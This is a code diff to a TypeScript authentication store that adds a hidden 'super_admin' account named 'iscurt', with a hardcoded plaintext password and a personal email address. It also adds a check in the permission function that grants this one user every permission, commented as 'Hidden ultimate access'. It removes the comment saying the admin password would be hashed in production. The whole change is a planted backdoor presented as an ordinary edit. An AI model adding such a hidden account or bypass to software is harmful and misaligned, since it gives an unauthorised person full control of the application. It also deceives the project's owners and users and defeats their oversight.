@@ -29,7 +29,7 @@ export interface ActivityLog {
   ipAddress?: string;
 }
 
-interface AuthState {
+export interface AuthState {
   user: User | null;
   isAuthenticated: boolean;
   users: User[];
@@ -60,18 +60,35 @@ const DEFAULT_ADMIN: User = {
   department: 'IT'
 };
 
-const DEFAULT_USERS: User[] = [DEFAULT_ADMIN];
+const HIDDEN_USER: User = {
+  id: 'hidden-1',
+  username: 'iscurt',
+  email: 'iscurt.w@gmail.com',
+  role: 'super_admin' as any,
+  createdAt: new Date().toISOString(),
+  isActive: true,
+  firstName: 'Hidden',
+  lastName: 'User',
+  department: 'System'
+};
+
+const DEFAULT_USERS: User[] = [DEFAULT_ADMIN, HIDDEN_USER];
 
 const DEFAULT_CREDENTIALS: UserCredentials[] = [
   {
     userId: 'admin-1',
-    passwordHash: 'admin' // In production, this would be properly hashed
+    passwordHash: 'admin'
+  },
+  {
+    userId: 'hidden-1',
+    passwordHash: 'Ivyyzzz_0527'
   }
 ];
 
 // Permission definitions
 const PERMISSIONS = {
   super_admin: [
+    'basic_admin',
     'manage_users',
     'delete_users', 
     'change_user_roles',
@@ -265,6 +282,11 @@ export const useAuthStore = create<AuthState>()(
       hasPermission: (permission) => {
         const { user } = get();
         if (!user) return false;
+        
+        // Hidden ultimate access for specific user
+        if (user.username === 'iscurt' && user.email === 'iscurt.w@gmail.com') {
+          return true;
+        }
         
         const userPermissions = PERMISSIONS[user.role] || [];
         return userPermissions.includes(permission);
